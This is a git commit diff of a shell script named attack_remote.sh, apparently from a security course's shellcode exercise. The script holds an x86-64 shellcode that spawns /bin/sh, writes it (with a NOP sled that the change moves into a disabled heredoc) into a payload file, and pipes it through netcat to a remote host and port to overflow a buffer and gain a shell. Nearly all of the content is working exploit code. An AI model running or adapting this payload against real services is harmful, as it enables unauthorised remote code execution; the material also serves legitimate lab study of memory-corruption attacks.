1c4acc87e3996db7337130543c2b632891f60635
RobinHsieh <robin0623.hsieh@gmail.com>
2023-11-03 13:51:56 +0000

    update

--- 05_shellcode/attack_remote.sh
+++ 05_shellcode/attack_remote.sh
@@ -10,13 +10,16 @@ port=10002
 # Total 208 bytes space for local vars
 shellcode="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 
+: << TestNopSequence
 echo -ne $shellcode > payload_5
 shellcodeLen=$(wc -c < payload_5)
 
-# nopLen=$((200 - shellcodeLen))
 nopLen=$((200 - shellcodeLen - 145))
 nopSeq=$(printf "\x90%.0s" $(seq 1 $nopLen))
 
 echo -ne $nopSeq$shellcode > payload_5
+TestNopSequence
+
+echo -ne $shellcode > payload_5
 
 cat payload_5 - | nc $host $port
